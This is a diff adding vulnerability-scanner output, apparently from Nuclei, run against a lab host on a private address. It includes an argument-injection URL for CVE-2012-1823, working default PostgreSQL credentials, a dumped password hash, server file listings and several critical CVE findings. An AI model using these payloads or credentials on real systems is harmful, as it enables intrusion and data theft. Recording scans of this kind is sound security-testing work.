@@ -1,0 +1,27 @@
+[CVE-2012-1823] [http] [high] http://192.168.56.101:80/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
+[phpmyadmin-panel] [http] [info] http://192.168.56.101:80/phpMyAdmin/index.php [paths="/phpMyAdmin/index.php"]
+[phpinfo-files] [http] [low] http://192.168.56.101:80/phpinfo.php [paths="/phpinfo.php"]
+[http-trace:trace-request] [http] [info] http://192.168.56.101:80
+[waf-detect:apachegeneric] [http] [info] http://192.168.56.101:80
+[postgres-default-logins] [javascript] [high] 192.168.56.101:5432 [passwords="postgres",usernames="postgres"]
+[samba-detect] [javascript] [info] 192.168.56.101:445 ["Samba 3.0.20-Debian"]
+[ssh-auth-methods] [javascript] [info] 192.168.56.101:22 ["["publickey","password"]"]
+[mysql-info] [javascript] [info] 192.168.56.101:3306 ["Version: 5.0.51a-3ubuntu5","Transport: tcp"]
+[pgsql-default-db] [javascript] [high] 192.168.56.101:5432 [database="postgres",password="postgres",usernames="postgres"]
+[ssh-diffie-hellman-logjam] [javascript] [low] 192.168.56.101:22
+[ssh-password-auth] [javascript] [info] 192.168.56.101:22
+[ssh-server-enumeration] [javascript] [info] 192.168.56.101:22 ["SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1"]
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.56.101:22
+[pgsql-file-read] [javascript] [high] 192.168.56.101:5432 ["pg_subtrans","base","pg_tblspc","PG_VERSION","pg_twophase","postmaster.opts","server.crt","pg_xlog","postmaster.pid","global","root.crt","server.key","pg_multixact","pg_clog"] [database="postgres",password="postgres",usernames="postgres"]
+[pgsql-list-database] [javascript] [high] 192.168.56.101:5432 ["template1","template0","postgres"] [database="postgres",password="postgres",usernames="postgres"]
+[pgsql-list-password-hashes] [javascript] [high] 192.168.56.101:5432 ["postgres : md53175bce1d3201d16594cebf9d7eb3f9d"] [database="postgres",password="postgres",usernames="postgres"]
+[pgsql-list-users] [javascript] [high] 192.168.56.101:5432 ["postgres"] [database="postgres",password="postgres",usernames="postgres"]
+[ssh-cbc-mode-ciphers] [javascript] [low] 192.168.56.101:22
+[ssh-weak-algo-supported] [javascript] [medium] 192.168.56.101:22
+[ssh-weak-mac-algo] [javascript] [low] 192.168.56.101:22
+[CVE-2004-2687] [tcp] [high] 192.168.56.101:3632
+[CVE-2020-1938] [tcp] [critical] 192.168.56.101:8009
+[ssh-weakkey-exchange-algo] [javascript] [low] 192.168.56.101:22
+[pgsql-default-db] [javascript] [high] 192.168.56.101:5432 [database="template1",password="postgres",usernames="postgres"]
+[pgsql-version-detect] [javascript] [high] 192.168.56.101:5432 ["PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)"] [database="postgres",password="postgres",usernames="postgres"]
+[ftp-anonymous-login] [tcp] [medium] 192.168.56.101:21
